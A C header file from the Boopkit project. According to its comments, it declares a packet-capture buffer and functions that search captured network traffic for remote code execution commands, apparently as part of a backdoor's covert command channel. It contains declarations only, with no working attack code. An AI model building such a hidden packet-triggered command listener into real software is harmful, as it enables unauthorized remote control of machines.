// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [dpi.h]

#ifndef BOOPKIT_DPI_H
#define BOOPKIT_DPI_H

/**
 * XCAP_BUFFER_SIZE is the size of the ring buffer for us to store
 * packets in memory to search for an RCE.
 *
 * The larger the memory footprint the higher the chance of finding
 * and RCE in memory.
 */
#define XCAP_BUFFER_SIZE 131072

extern int runtime__xcap;

typedef struct xcap_ip_packet {
  int captured;
  struct ip *iph;
  unsigned char *packet;
  struct pcap_pkthdr *header;
} xcap_ip_packet;

void *xcap(void *v_dev_name);
int xcaprce(char search[INET_ADDRSTRLEN], char *rce);

#endif  // BOOPKIT_DPI_H